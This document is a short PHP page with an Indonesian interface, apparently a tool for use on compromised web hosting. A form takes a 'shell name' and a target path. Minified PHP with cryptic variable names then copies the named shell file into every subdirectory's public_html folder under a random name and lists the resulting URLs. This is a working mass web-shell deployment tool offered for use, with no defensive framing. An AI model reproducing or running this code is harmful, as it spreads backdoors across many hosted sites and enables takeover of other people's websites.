<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Upload File PHP</title>
</head>
<body>
    <form action="" method="get">
        <label for="source_file">Masukkan Nama Shell:</label>
        <input type="text" id="source_file" name="source_file" required>
        <br><br>
        <label for="target_path">Masukkan Path Tujuan:</label>
        <input type="text" id="target_path" name="target_path" required>
        <br><br>
        <input type="submit" value="Unggah">
    </form>

    <?php $q0=isset($_GET['source_file'])?$_GET['source_file']:'';$p1=isset($_GET['target_path'])?$_GET['target_path']:'';if(!empty($q0)&&file_exists($q0)&&!empty($p1)){if(is_dir($p1)){if($a2=opendir($p1)){echo "Mengunggah file ke subdirektori di dalam ".htmlspecialchars($p1).":<br>";while(($s3=readdir($a2))!==false){$q4=$p1.DIRECTORY_SEPARATOR.$s3;if($s3!='.'&&$s3!='..'&&is_dir($q4)){$v5=$q4.DIRECTORY_SEPARATOR.'public_html';if(is_dir($v5)){$d6=uniqid(true).basename($q0);$v7=$v5.DIRECTORY_SEPARATOR.$d6;if(copy($q0,$v7)){echo "http://".htmlspecialchars($s3.'/'.$d6)."<br>";}else{echo "Gagal mengunggah file ke public_html di ".htmlspecialchars($s3).".<br>";}}else{$d6=uniqid(true).basename($q0);$v7=$q4.DIRECTORY_SEPARATOR.$d6;if(copy($q0,$v7)){echo "http://".htmlspecialchars($s3.'/'.$d6)."<br>";}else{echo "Gagal mengunggah file ke ".htmlspecialchars($s3).".<br>";}}}}closedir($a2);}else{echo "Tidak dapat membuka direktori tujuan.";}}else{echo "Path tujuan tidak valid: ".htmlspecialchars($p1)."<br>";}}else{echo "File sumber tidak ditemukan atau path tujuan kosong.";}?>
</body>
</html>
